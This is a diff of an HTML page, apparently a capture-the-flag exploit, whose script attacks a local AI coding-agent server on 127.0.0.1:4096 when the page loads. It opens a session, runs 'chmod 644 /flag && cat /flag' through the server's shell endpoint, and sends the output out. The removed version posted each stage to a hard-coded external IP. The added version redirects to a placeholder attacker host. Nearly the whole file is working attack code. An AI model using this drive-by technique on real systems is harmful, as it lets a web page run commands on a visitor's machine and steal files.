@@ -1,70 +1,52 @@
-
-  <!doctype html>
-  <meta charset="utf-8">
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>loading</title>
+    <style>
+      body {
+        margin: 0;
+        min-height: 100vh;
+        display: grid;
+        place-items: center;
+        background: #111;
+        color: #ddd;
+        font: 16px/1.4 Consolas, Monaco, monospace;
+      }
+      pre {
+        white-space: pre-wrap;
+        max-width: 90vw;
+      }
+    </style>
+  </head>
+  <body>
+    <pre id="status">booting...</pre>
   <script>
   (async () => {
-    const WEBHOOK = "https://47.118.30.30:9999";
     const BASE = "http://127.0.0.1:4096";
+    const EXFIL = "http://YOUR_PUBLIC_IP:9999";
 
-    async function exfiltrate(text) {
-      try {
-        await fetch(WEBHOOK, {
-          method: "POST",
-          mode: "no-cors",
-          headers: { "Content-Type": "text/plain" },
-          body: text,
-          keepalive: true
-        });
-      } catch {}
-    }
+    const s = await fetch(`${BASE}/session`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: "{}"
+    });
+    const session = await s.json();
 
-    function summarizeShellResult(rawText) {
-      try {
-        const parsed = JSON.parse(rawText);
-        const output = parsed?.parts?.[0]?.state?.output;
-        if (typeof output === "string" && output.length > 0) {
-          return output;
-        }
-      } catch {}
-      return rawText;
-    }
+    const r = await fetch(`${BASE}/session/${session.id}/shell`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        agent: "build",
+        command: "chmod 644 /flag && cat /flag"
+      })
+    });
 
-    try {
-      const healthResp = await fetch(`${BASE}/global/health`);
-      const healthText = await healthResp.text();
-      await exfiltrate(`stage=health\nstatus=${healthResp.status}\n\n${healthText}`);
+    const text = await r.text();
 
-      const sessionResp = await fetch(`${BASE}/session`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: "{}",
-        credentials: "omit"
-      });
-      const sessionText = await sessionResp.text();
-      const session = JSON.parse(sessionText);
-
-      await exfiltrate(
-        `stage=session\nstatus=${sessionResp.status}\nsession_id=${session.id}\n\n${sessionText}`
-      );
-
-      const shellResp = await fetch(`${BASE}/session/${session.id}/shell`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          agent: "build",
-          command: "chmod 644 /flag && cat /flag"
-        }),
-        credentials: "omit"
-      });
-
-      const shellText = await shellResp.text();
-      const output = summarizeShellResult(shellText);
-
-      await exfiltrate(
-        `stage=flag\nstatus=${shellResp.status}\nsession_id=${session.id}\n\n${output}\n\n[raw]\n${shellText}`
-      );
-    } catch (error) {
-      await exfiltrate(`stage=error\n\n${error && error.stack ? error.stack : String(error)}`);
-    }
+    location.href = `${EXFIL}/?d=${encodeURIComponent(text)}`;
   })();
   </script>
+  </body>
+  </html>
